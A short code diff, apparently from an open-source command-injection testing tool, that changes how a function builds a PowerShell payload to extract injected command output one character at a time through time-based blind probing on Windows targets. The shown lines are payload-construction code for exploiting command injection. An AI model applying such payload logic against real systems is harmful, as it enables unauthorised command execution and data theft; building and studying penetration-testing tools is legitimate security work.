@@ -547,9 +547,9 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
       # The ordinal has to be computed on the target: cmd.exe's IF compares strings by locale
       # collation ('M' GEQ 'a' holds), so only a numeric compare can be binary searched.
       payload = checks.windows_probe(chain,
-                                     "powershell.exe -InputFormat none write "
-                                     "([int][char](([string](cmd /c " + cmd + ")).trim().substring(" +
-                                     str(num_of_chars - 1) + ",1)))",
+                                     "powershell.exe -InputFormat none write ([int](" +
+                                     checks.windows_output_bytes(checks.windows_output_text(cmd)) +
+                                     "[" + str(num_of_chars - 1) + "]))",
                                      win_operator, ascii_char, timesec)
 
   else:
